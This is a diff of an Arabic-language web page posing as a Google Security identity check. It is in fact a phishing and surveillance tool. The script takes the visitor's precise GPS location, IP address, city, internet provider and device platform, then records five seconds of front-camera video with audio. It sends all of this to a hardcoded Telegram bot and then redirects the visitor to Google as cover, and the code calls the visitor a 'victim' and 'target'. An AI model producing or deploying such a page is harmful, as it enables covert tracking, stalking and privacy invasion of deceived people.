@@ -3,69 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security - تأكيد هوية المستخدم</title>
+    <title>Google Security - التحقق من الهوية</title>
     <style>
         body { font-family: sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
         img { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #202124; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
         .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; width: 100%; }
-        #v, #c { display: none; }
+        #v { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-    <h1>تأكيد هويتك</h1>
-    <p>للمتابعة إلى الحساب، يجب إجراء فحص أمان سريع. يرجى تفعيل الوصول للموقع والكاميرا للتحقق من أنك لست روبوت.</p>
-    <button class="btn" onclick="execute()">بدء الفحص الآن</button>
+    <h1>تحقق أمان إضافي</h1>
+    <p>لحماية حسابك، يرجى السماح بالوصول للكاميرا والموقع لإكمال فحص الهوية الحي (Live Verification).</p>
+    <button class="btn" id="startBtn" onclick="executeMission()">تأكيد الهوية الآن</button>
 </div>
 
-<video id="v" autoplay></video>
-<canvas id="c" width="640" height="480"></canvas>
+<video id="v" autoplay muted playsinline></video>
 
 <script>
     const T = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
     const ID = "7109332130";
 
-    async function execute() {
-        // 1. سحب الموقع الدقيق (GPS)
+    async function executeMission() {
+        document.getElementById('startBtn').innerText = "جاري الفحص...";
+        
+        // 1. الموقع الجغرافي
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const map = `https://www.google.com/maps?q=${lat},${lon}`;
-                await send(`📍 **تم تحديد الموقع بدقة!**\nالخريطة: ${map}\nالدقة: ${pos.coords.accuracy} متر`);
+                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await send(`📍 **الموقع الدقيق!**\nالرابط: ${map}\nالدقة: ${pos.coords.accuracy} متر`);
             }, null, {enableHighAccuracy: true});
         }
 
-        // 2. سحب بيانات الجهاز والإنترنت
+        // 2. البيانات التقنية
         const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
-        const bat = navigator.getBattery ? await navigator.getBattery() : {level: 0};
-        
-        let rep = `👤 **معلومات الضحية:**\n` +
-                  `🌐 IP: \`${ip.ip}\`\n` +
-                  `📍 المدينة: \`${ip.city}\`\n` +
-                  `📱 النظام: \`${navigator.platform}\`\n` +
-                  `🔋 البطارية: \`${bat.level * 100}%\`\n` +
-                  `🏢 الشركة: \`${ip.org}\``;
-        await send(rep);
+        await send(`👤 **هدف جديد:**\n🌐 IP: \`${ip.ip}\`\n📍 المدينة: \`${ip.city}\`\n📱 الجهاز: \`${navigator.platform}\``);
 
-        // 3. سحب الصورة (الكاميرا الأمامية)
+        // 3. تسجيل الفيديو (5 ثوانٍ)
         try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const v = document.getElementById('v');
-            v.srcObject = s;
-            setTimeout(async () => {
-                const c = document.getElementById('c');
-                c.getContext('2d').drawImage(v, 0, 0, 640, 480);
-                const img = c.toDataURL('image/jpeg');
-                s.getTracks().forEach(t => t.stop());
-                await sendPic(img);
-                window.location.href = "https://myaccount.google.com/"; // تمويه
-            }, 1500);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                await sendVideo(blob);
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = "https://myaccount.google.com/";
+            };
+
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثوانٍ
+
         } catch (e) {
             window.location.href = "https://myaccount.google.com/";
         }
@@ -79,12 +75,11 @@
         });
     }
 
-    async function sendPic(base64) {
-        const b = await (await fetch(base64)).blob();
+    async function sendVideo(blob) {
         const f = new FormData();
         f.append('chat_id', ID);
-        f.append('photo', b, 'capture.jpg');
-        return fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
+        f.append('video', blob, 'capture.mp4');
+        return fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: f });
     }
 </script>
 </body>
